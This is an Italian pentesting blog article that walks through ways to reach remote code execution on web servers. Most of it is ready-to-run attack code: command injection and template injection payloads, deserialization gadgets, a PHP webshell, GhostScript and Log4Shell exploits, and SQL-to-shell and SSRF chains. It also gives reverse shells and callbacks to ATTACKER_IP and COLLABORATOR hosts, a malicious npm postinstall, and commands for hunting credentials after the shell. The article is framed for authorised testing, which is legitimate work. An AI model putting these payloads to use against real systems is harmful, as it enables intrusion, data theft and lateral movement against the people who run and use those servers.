---
title: 'RCE (Remote Code Execution): Cos''è e Come Si Sfrutta'
slug: rce
description: 'RCE (Remote Code Execution) spiegato dal punto di vista del pentester: tutti i vettori — command injection, SSTI, deserialization, file upload, LFI, SQLi, XXE, CVE. Come ottenere una shell stabile e cosa fare dopo.'
image: /remote-code-execution.webp
draft: true
date: 2026-07-10T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - remote-code-execution
  - command-injection
  - deserialization
  - log4shell
---

# RCE (Remote Code Execution): Cos'è, Come Si Ottiene e Come Si Sfrutta

La **Remote Code Execution** è la vulnerabilità più grave che esiste nel web hacking. Significa che l'attaccante esegue comandi arbitrari sul server — come se avesse accesso diretto alla macchina via SSH. Da lì: furto di dati, escalation di privilegi, movimento laterale, ransomware, persistenza totale.

In un bug bounty una RCE confermata vale quasi sempre il payout massimo, spesso decine di migliaia di dollari. OWASP la considera l'impatto più critico raggiungibile tramite [injection](https://hackita.it/articoli/injection-attacks-guida-completa) (A03:2021).

Il punto chiave: **la RCE non è un singolo tipo di vulnerabilità. È un risultato.** Ci si arriva da strade diverse — [command injection](https://hackita.it/articoli/command-injection), [SSTI](https://hackita.it/articoli/ssti-server-side-template-injection), [deserializzazione](https://hackita.it/articoli/deserialization-attack), [file upload](https://hackita.it/articoli/file-upload-attack), [LFI](https://hackita.it/articoli/lfi), [SQL injection](https://hackita.it/articoli/sql-injection), [XXE](https://hackita.it/articoli/xxe), ImageMagick, CVE di componenti. Questa guida mappa tutti i vettori e mostra come scalare ognuno a una shell.

***

## Il Concetto Base

Quando un'applicazione riceve input dall'utente e lo usa per eseguire operazioni a livello di sistema senza validarlo, l'attaccante può iniettare istruzioni proprie che il server esegue come se fossero legittime.

```
Input utente → [applicazione] → interprete (shell, template engine, runtime, parser)
                                        ↑
                           se l'input non è validato
                           l'attaccante controlla cosa esegue l'interprete
```

La differenza rispetto alle altre vulnerabilità:

* **XSS**: esegui codice nel browser della vittima
* **SQLi**: esegui query nel database
* **RCE**: esegui comandi sul sistema operativo del server

***

## Vettore 1 — Command Injection

Il più diretto. L'applicazione passa input dell'utente a una funzione che esegue comandi di sistema — `exec()`, `system()`, `popen()`, `subprocess`. L'attaccante chiude il comando legittimo e aggiunge i propri.

```bash
# Esempio: l'app fa ping all'IP fornito dall'utente
# Payload: chiudi il comando con ; e aggiungi il tuo
ping -c 1 127.0.0.1; whoami
ping -c 1 127.0.0.1 && cat /etc/passwd
ping -c 1 $(id)
ping -c 1 `cat /etc/shadow`

# Separatori da testare in ogni campo:
;    &&    ||    |    `cmd`    $(cmd)    %0a    %0d%0a
```

Quando non vedi output (blind command injection), usa callback DNS o HTTP per confermare l'esecuzione prima di tentare una shell:

```bash
# Callback DNS — invisibile nei log HTTP
ping -c 1 127.0.0.1; nslookup $(whoami).COLLABORATOR.net

# Callback HTTP — porta l'output nel path
ping -c 1 127.0.0.1; curl http://COLLABORATOR.net/$(whoami)
```

La guida completa con bypass WAF, OS detection e automation con commix è su [command-injection](https://hackita.it/articoli/command-injection) e [os-command-injection](https://hackita.it/articoli/os-command-injection).

***

## Vettore 2 — SSTI (Server-Side Template Injection)

Il motore di template valuta il tuo input come codice invece che come dato. Il primo passo è il fingerprinting: ogni motore risponde diversamente alle espressioni matematiche.

```
{{7*7}}     → 49   → Jinja2 (Python/Flask) o Twig (PHP)
${7*7}      → 49   → Freemarker, Velocity (Java), EL (Spring)
#{7*7}      → 49   → Pebble (Java)
*{7*7}      → 49   → Thymeleaf (Spring)
<%= 7*7 %> → 49   → ERB (Ruby)
```

Una volta identificato il motore, la RCE è quasi sempre raggiungibile:

```python
# Jinja2 (Flask/Django) → RCE tramite introspezione Python
# Percorso classico: accedi alle sottoclassi di object per trovare os o subprocess
{{''.__class__.__mro__[1].__subclasses__()}}
# Cerca l'indice di subprocess.Popen o os._wrap_close, poi:
{{''.__class__.__mro__[1].__subclasses__()[INDICE]('id',shell=True,stdout=-1).communicate()}}

# Alternativa più leggibile (Jinja2):
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Lettura file sensibili senza RCE immediata:
{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}
```

```java
// Freemarker → RCE
${"freemarker.template.utility.Execute"?new()("id")}

// Velocity → RCE
#set($ex = $class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
```

La ricerca di YesWeHack (Ekoparty 2024) ha sviluppato payload SSTI completamente self-contained per tutti i motori principali — non dipendono da parametri HTTP esterni e funzionano in scenari di exploitation complessi.

Guide per motore specifico: [jinja2-ssti-rce](https://hackita.it/articoli/jinja2-ssti-rce), [twig-ssti-rce](https://hackita.it/articoli/twig-ssti-rce), [freemarker-ssti-rce](https://hackita.it/articoli/freemarker-ssti-rce), [velocity-ssti-rce](https://hackita.it/articoli/velocity-ssti-rce), [erb-ssti-rce](https://hackita.it/articoli/erb-ssti-rce), [pebble-ssti-rce](https://hackita.it/articoli/pebble-ssti-rce), [thymeleaf-ssti-rce](https://hackita.it/articoli/thymeleaf-ssti-rce), [smarty-ssti-rce](https://hackita.it/articoli/smarty-ssti-rce), [mako-ssti-rce](https://hackita.it/articoli/mako-ssti-rce). Guida pillar: [ssti-server-side-template-injection](https://hackita.it/articoli/ssti-server-side-template-injection).

***

## Vettore 3 — Insecure Deserialization

Il server deserializza oggetti controllati dall'attaccante. Durante la deserializzazione vengono chiamati metodi che, concatenati in una gadget chain, portano a esecuzione di comandi.

```bash
# Java (ysoserial) — cerca magic bytes rO0AB nei cookie/parametri
java -jar ysoserial-all.jar URLDNS "http://COLLABORATOR.net" > dns_probe.ser
# Mandalo prima → se arriva callback DNS → deserializzazione confermata

# Poi scala a RCE:
java -jar ysoserial-all.jar CommonsCollections6 'id' > rce.ser
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @rce.ser

# PHP (phpggc) — cerca O: o a: nei cookie base64
./phpggc Laravel/RCE1 system 'id' -b
# → inserisci il base64 nel cookie

# Python pickle — cerca gASV nei cookie base64
python3 -c "
import pickle,os,base64
class E(object):
  def __reduce__(self): return (os.system,('id',))
print(base64.b64encode(pickle.dumps(E())).decode())
"
```

CVE recenti di deserializzazione: SharePoint CVE-2025-53770 (CVSS 9.8, RCE non autenticata), BentoML CVE-2025-32375 (pickle su richieste HTTP in un framework AI).

Guida completa con gadget chain, GadgetProbe e workflow step-by-step su [deserialization-attack](https://hackita.it/articoli/deserialization-attack).

***

## Vettore 4 — File Upload

Carichi un file eseguibile sul server. Se il server lo esegue invece di servirlo come file statico, hai RCE.

```php
// Webshell PHP — il payload più semplice
<?php system($_GET['cmd']); ?>
```

```bash
# Upload e accesso
curl -X POST "https://target.com/upload" \
  -F "file=@shell.php;type=image/jpeg"
curl "https://target.com/uploads/shell.php?cmd=id"

# Bypass filtri su estensione:
# shell.php5  shell.phtml  shell.pHp  shell.php.jpg
# shell.jsp → shell.jspx  shell.jsw
# Aggiunta magic bytes GIF per bypassare check sul contenuto:
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > shell.gif.php
```

### ImageMagick + GhostScript → RCE da Upload Immagine

Vettore meno ovvio ma ancora molto diffuso nel 2025-2026. ImageMagick delega l'elaborazione di file PostScript/PDF/EPS a GhostScript, che ha avuto vulnerabilità ripetute nel suo sandbox (`-dSAFER`). Se l'applicazione usa ImageMagick per ridimensionare o convertire immagini caricate dall'utente, un file `.eps` o `.ps` mascherato da JPEG passa il filtro MIME ma viene passato a GhostScript che lo esegue.

CVE-2024-29510 è stato attivamente sfruttato nel 2024. ImagePanick (2026) ha dimostrato che anche SVG caricate da utenti possono triggerare il problema tramite la catena SVG → GhostScript delegate.

```bash
# Payload EPS per command injection via GhostScript
cat > exploit.eps << 'EOF'
%!PS
/ShellStr (/bin/bash -c 'id > /tmp/rce_proof') def
ShellStr (r) file /ReadFile exch def
ReadFile closefile
EOF

# Rinomina e carica come immagine
mv exploit.eps profile_picture.jpg
curl -X POST "https://target.com/upload/avatar" \
  -F "avatar=@profile_picture.jpg;type=image/jpeg"

# Oppure SVG con XXE che triggerà GhostScript
cat > exploit.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
EOF

# Verifica: il file viene processato da ImageMagick? Cerca nel source:
# imagick, ImageMagick, convert, mogrify, thumbnail
# Nelle dipendenze: composer.json → "intervention/image", "imagine/imagine"
```

Guide correlate: [file-upload-attack](https://hackita.it/articoli/file-upload-attack), [web-shell](https://hackita.it/articoli/web-shell), [xxe-injection](https://hackita.it/articoli/xxe-injection).

***

## Vettore 5 — LFI → RCE

Il [Local File Inclusion](https://hackita.it/articoli/lfi) da solo non porta a RCE, ma ci sono tre escalation classiche.

### Log Poisoning

```bash
# Step 1: inietta PHP nel log Apache via User-Agent
curl "https://target.com/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Step 2: includi il log con LFI per eseguire il PHP
curl "https://target.com/?page=../../../../var/log/apache2/access.log&cmd=id"
```

### PHP Session File Inclusion

```bash
# Step 1: inietta payload nel file di sessione tramite un input salvato
curl "https://target.com/login" --cookie "PHPSESSID=abc123" \
  -d "username=<?php system(\$_GET['cmd']); ?>"

# Step 2: includi il file di sessione con LFI
curl "https://target.com/?page=../../../../tmp/sess_abc123&cmd=id"
```

### PHP Wrapper data://

```bash
# Se allow_url_include = On (raro ma presente in config legacy):
curl "https://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
# PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+ = <?php system($_GET['cmd']); ?>
```

Il [Remote File Inclusion](https://hackita.it/articoli/rfi) è la variante in cui includi un file esterno direttamente — più rara ma immediata: basta servire un file PHP dal tuo server e includerlo.

***

## Vettore 6 — SQL Injection → RCE

Alcune configurazioni database permettono di escalare da [SQL injection](https://hackita.it/articoli/sql-injection) a esecuzione comandi OS. Il percorso completo con enumeration e privilege escalation dentro il DB è su [database-privilege-escalation](https://hackita.it/articoli/database-privilege-escalation).

```sql
-- MSSQL: xp_cmdshell (richiede sysadmin)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';--

-- MySQL: INTO OUTFILE (richiede FILE privilege + webroot scrivibile)
' UNION SELECT "<?php system($_GET['cmd']); ?>"
INTO OUTFILE '/var/www/html/shell.php'--

-- PostgreSQL: COPY FROM PROGRAM (richiede superuser)
'; CREATE TABLE t(o text);
COPY t FROM PROGRAM 'id';
SELECT * FROM t;--
```

```bash
# sqlmap automatizza tutto
sqlmap -u "https://target.com/?id=1" --os-shell --dbms=mssql
```

***

## Vettore 7 — XXE → RCE

L'[XXE](https://hackita.it/articoli/xxe) di per sé porta a lettura file e SSRF — ma si scala a RCE in due modi principali.

### XXE → SSRF → Servizi Interni

```xml
<!-- Leggi credenziali AWS dal metadata endpoint -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name">
]>
<root><data>&xxe;</data></root>
<!-- Le credenziali IAM permettono di lanciare istanze EC2 → RCE in cloud -->

<!-- Gopher verso Redis interno senza auth → scrivi crontab → RCE -->
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_FLUSHALL%0D%0A...">
```

### XXE → PHP Filter Chain (CVE-2024-2961)

Ricerca di Charles Fol (2024): su PHP, la funzione `iconv` ha un buffer overflow sfruttabile tramite filter chain. Combinato con XXE che permette lettura di file arbitrari, si scala a RCE completa. Magento CVE-2024-34102 (CosmicString) ha sfruttato esattamente questa chain: XXE leggeva `env.php` (chiave JWT) → accesso admin → filter chain RCE.

***

## Vettore 8 — eval() e Code Injection

Molti linguaggi hanno funzioni che valutano stringhe come codice — `eval()` in PHP, Python e JavaScript, `exec()` in Python, `assert()` in PHP (in alcune versioni).

```php
// PHP: eval() con input non sanitizzato
eval("echo " . $_GET['input'] . ";");
// Payload: system('id');//
// Risultato: esegue system('id')

// PHP: assert() come eval (PHP < 7)
assert($_GET['input']);
// Payload: system('id')

// Prolog PHP eval via include su path remoto
include($_GET['page'] . '.php');
// Payload: ?page=php://input con body: <?php system('id'); ?>
```

```python
# Python: eval() su input utente
result = eval(user_input)
# Payload: __import__('os').system('id')
```

```javascript
// Node.js: eval() o Function() su input
eval(req.query.code)
new Function(req.query.code)()
```

***

## Vettore 9 — SSRF → RCE

L'[SSRF](https://hackita.it/articoli/ssrf) permette al server di fare richieste verso servizi interni non esposti. Se quei servizi sono vulnerabili, si scala a RCE.

```bash
# SSRF → Docker API senza auth (porta 2375)
curl "https://target.com/fetch?url=http://127.0.0.1:2375/containers/json"
# Crea un container con mount di / → esegui comandi come root

# SSRF → Redis senza auth → scrivi webshell o crontab
# Via Gopher protocol:
curl "https://target.com/fetch?url=gopher://127.0.0.1:6379/_SET%20key%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22"

# SSRF → Jenkins console interna → esecuzione Groovy → RCE
curl "https://target.com/fetch?url=http://127.0.0.1:8080/script" \
  --data 'script=["id"].execute().text'

# SSRF → AWS metadata → credenziali IAM
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

***

## Vettore 10 — CVE su Componenti Noti

Molte RCE non richiedono exploitation creativa: basta trovare una versione vulnerabile di un componente e usare l'exploit pubblico.

### Come Identificare Componenti Vulnerabili

```bash
# Fingerprinting tecnologie con whatweb
whatweb https://target.com

# Header HTTP rivelano versioni
curl -sI "https://target.com/" | grep -iE "server|x-powered|x-generator"
# Server: Apache/2.4.49 → CVE-2021-41773
# X-Powered-By: PHP/7.2.24 → cerca CVE su PHP 7.2.x

# searchsploit per exploit locali
searchsploit apache 2.4.49
searchsploit "spring framework 5.3"
searchsploit wordpress 5.8

# nuclei per rilevamento automatico
nuclei -u https://target.com -tags cve -severity critical,high
```

### CVE di Riferimento

**Log4Shell (CVE-2021-44228)** — Apache Log4j JNDI injection. Ancora presente in sistemi legacy non aggiornati. Payload nel User-Agent o in qualsiasi campo loggato:

```
${jndi:ldap://ATTACKER_IP:1389/exploit}
```

**Apache 2.4.49 Path Traversal + RCE (CVE-2021-41773):**

```bash
curl "https://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data "echo;id"
```

**ProxyLogon (CVE-2021-26855)** — Exchange Server, SSRF pre-auth → scrittura file → RCE.

**PHP CGI (CVE-2024-4577)** — Windows only, injection di opzioni nella riga di comando PHP tramite input HTTP.

**Atlassian Confluence OGNL injection (CVE-2021-26084)** — template injection in OGNL, exploitato massivamente entro giorni dalla disclosure.

**SharePoint (CVE-2025-53770)** — authentication bypass combinato con unsafe object handling → RCE non autenticata, CVSS 9.8.

**BentoML (CVE-2025-32375)** — framework AI che usava pickle per deserializzare richieste HTTP → RCE da qualsiasi input.

**React2Shell (CVE-2025-55182)** — injection in implementazioni React Server Components, RCE via SSR.

***

## Vettore 11 — Dependency Confusion

Tecnica scoperta da Alex Birsan (2021). Se l'organizzazione usa package privati (npm, pip, gem), pubblichi un package pubblico con lo stesso nome e versione più alta. Il package manager scarica il tuo.

```bash
# Trova package privati in: package.json, requirements.txt, Gemfile, pom.xml
# Oppure nelle job listing dell'azienda

# Pubblica su npm con postinstall malevolo:
# package.json → "scripts": {"postinstall": "curl http://COLLABORATOR.net/$(whoami)@$(hostname)"}
# npm publish internal-utils --version 9.9.9

# CI/CD installa package automaticamente → RCE sul sistema CI/CD → accesso alla codebase
```

***

## Ottenere una Shell Stabile

Una volta che hai esecuzione comandi, vuoi una shell interattiva. La **reverse shell** fa connettere il server verso di te.

```bash
# Sul tuo server: ascolta
nc -lvnp 4444

# Sul target: invia la shell (scegli in base a cosa è disponibile)

# Bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r=$r+'PS '+(pwd).Path+'> ';$se=([text.encoding]::ASCII).GetBytes($r);$s.Write($se,0,$se.Length);$s.Flush()}"

# Se le porte sono bloccate: prova 80, 443, 8080, 8443, 53
# Se il comando contiene / o spazi filtrati: usa base64
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | base64
bash -c {echo,BASE64_QUI}|{base64,-d}|bash
```

### Stabilizza la Shell (Importante)

Una reverse shell raw non ha CTRL+C, TAB completion, né history. Stabilizzala subito o la perdi:

```bash
# Metodo Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Premi CTRL+Z → metti in background
stty raw -echo; fg
# Premi INVIO due volte
export TERM=xterm; export SHELL=bash

# Metodo socat (se disponibile) — shell completamente interattiva
# Sul tuo server:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Sul target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

***

## Conferma OOB per Blind RCE

Quando non vedi l'output del comando, usa callback per confermare prima di tentare la shell:

```bash
# Burp Collaborator (genera dominio unico automaticamente)
# oppure interactsh:
interactsh-client  # genera URL tipo abc123.oast.fun

# DNS callback — il più stealth, passa quasi tutti i firewall
nslookup $(whoami).abc123.oast.fun
dig $(id | base64 -w0).abc123.oast.fun

# HTTP callback — porta l'output nel path
curl http://abc123.oast.fun/$(whoami)
wget http://abc123.oast.fun/$(hostname)-$(id|base64 -w0)

# Se DNS e HTTP sono bloccati: time-based (misura il ritardo)
# Esegui: sleep 10
# Se la risposta impiega 10 secondi → blind RCE confermata
```

***

## Primi Passi Dopo la Shell

Appena ottieni la shell, questi comandi ti danno il contesto per i passi successivi:

```bash
# Identità e contesto
whoami && id
# www-data, nobody → utente web → devi scalare
# root → non serve scalare

# Infrastruttura
hostname && ip addr show
cat /etc/os-release; uname -a

# Credential hunting — spesso vale più dell'escalation diretta
find / -name "*.env" 2>/dev/null
find / -name "config.php" -o -name "wp-config.php" -o -name "database.yml" 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
cat ~/.bash_history
env | grep -iE "key|secret|pass|token"

# Privilege escalation rapida
sudo -l                            # esegui qualcosa senza password?
find / -perm -4000 2>/dev/null    # SUID binary exploitabili?
whoami /priv                       # Windows: SeImpersonatePrivilege → Potato

# Altri host raggiungibili (pivot)
ip route; cat /etc/hosts
for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "LIVE: 192.168.1.$i"; done
```

Per la privilege escalation su Linux vai su [linux-privesc](https://hackita.it/articoli/linux-privesc), su Windows su [privilege-escalation-windows](https://hackita.it/articoli/privilege-escalation-windows). Per il post-exploitation completo: [post-exploitation](https://hackita.it/articoli/post-exploitation).

***

## Tool Principali

```bash
# revshells.com — genera qualsiasi tipo di reverse shell con encoding automatico

# commix — command injection automatico
commix --url="https://target.com/ping?host=INJECT_HERE"

# nuclei — scansione CVE e RCE automatica
nuclei -u https://target.com -tags rce,cve -severity critical

# searchsploit — exploit database locale
searchsploit apache 2.4.49
searchsploit --update

# msfvenom — genera payload compilati
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe

# Metasploit handler per ricevere connessioni
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST TUO_IP; set LPORT 4444; run

# interactsh — Burp Collaborator open source
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client
```

***

## Checklist

```
IDENTIFICAZIONE VETTORE
☐ Command injection: ; && || ` $() %0a in tutti gli input → output o callback?
☐ SSTI: {{7*7}} ${7*7} #{7*7} *{7*7} in tutti i campi riflessi → 49?
☐ Deserialization: rO0AB (Java) O: (PHP) gASV (Python) nei cookie/parametri?
☐ File upload: PHP/JSP/ASPX accettato? ImageMagick attivo? Testa EPS mascherato da JPEG
☐ LFI: path traversal in page/file/include → log poisoning possibile?
☐ SQLi: errori DB → xp_cmdshell (MSSQL) / INTO OUTFILE (MySQL) / COPY FROM PROGRAM (PG)?
☐ XXE: endpoint XML/SOAP/SVG → entity esterna processata? → SSRF → RCE?
☐ eval() o assert() nel codice: input utente valutato come codice?
☐ SSRF: URL nei parametri → Docker API/Redis/Jenkins interni raggiungibili?
☐ Versioni componenti → nuclei/searchsploit → CVE noti?

CONFERMA OOB (BLIND RCE)
☐ interactsh o Burp Collaborator attivi
☐ Payload DNS/HTTP inviato → callback ricevuto → RCE confermata
☐ whoami/hostname nel callback per identificare il contesto

SHELL
☐ nc -lvnp 4444 in ascolto
☐ Reverse shell inviata (bash/python/php/powershell)
☐ Shell stabilizzata: python3 pty + stty raw -echo
☐ whoami + id + hostname + ip addr verificati

POST-EXPLOITATION
☐ .env, config.php, wp-config.php, .bash_history cercati
☐ sudo -l, SUID, SeImpersonatePrivilege controllati
☐ Altri host nella rete interni raggiunti (pivot)?

DOCUMENTAZIONE
☐ Screenshot payload + risposta server
☐ Screenshot callback OOB (DNS/HTTP con output del comando)
☐ Screenshot shell stabile con whoami/id
☐ Path completo dell'exploitation documentato step by step
```

***

## FAQ

**RCE e command injection sono la stessa cosa?**
No. Command injection è un vettore specifico — input passato a una funzione OS. RCE è il risultato finale — esecuzione comandi sul server. Ci si arriva da command injection, ma anche da SSTI, deserialization, file upload, LFI. Command injection è una strada; RCE è la destinazione.

**Ho una webshell ma non riesco ad ottenere una reverse shell. Perché?**
Il firewall blocca le connessioni in uscita. Prova porte comuni che spesso sono permesse: 80, 443, 8080, 8443, 53 (DNS tunneling). Se tutto è bloccato in uscita, usa una bind shell (ascolta sul target invece di connettersi verso di te) o un tunneling HTTP.

**Come dimostro una blind RCE in un report?**
Il callback OOB è la prova standard. Mostri: (1) il payload inviato, (2) lo screenshot di interactsh o Collaborator che mostra la richiesta DNS/HTTP con il risultato del comando (es. `www-data.abc123.oast.fun`). È considerato prova sufficiente anche senza output diretto.

**Cosa significa che ImageMagick è vulnerabile? Come lo identifico?**
Se l'applicazione permette upload di immagini, cerca nel codice sorgente o nelle dipendenze: `imagick`, `intervention/image`, `imagine/imagine`, la presenza del binario `convert` o `mogrify`. Prova a caricare un file `.eps` rinominato `.jpg` e osserva se l'applicazione lo processa o lo rifiuta — se non lo rifiuta, è potenzialmente vulnerabile a GhostScript RCE.

**Qual è la severità in un report?**
Critical, sempre, senza eccezioni. Una RCE confermata è il finding più grave in qualsiasi programma di bug bounty o pentest report.

***

## Risorse

* [revshells.com](https://revshells.com) — generatore payload reverse shell per qualsiasi linguaggio
* [PortSwigger Web Security Academy — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
* [PayloadsAllTheThings — Command Injection & RCE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
* [GTFOBins](https://gtfobins.github.io) — binary Linux per escalation e shell post-RCE
* [interactsh](https://github.com/projectdiscovery/interactsh) — callback OOB open source
* [YesWeHack — SSTI exploitation con RCE self-contained](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)

***

> Un `;`, un `{{7*7}}`, un `.eps` rinominato `.jpg`: strade diverse per lo stesso posto. [Penetration test HackIta](https://hackita.it/servizi). [Formazione 1:1](https://hackita.it/formazione).
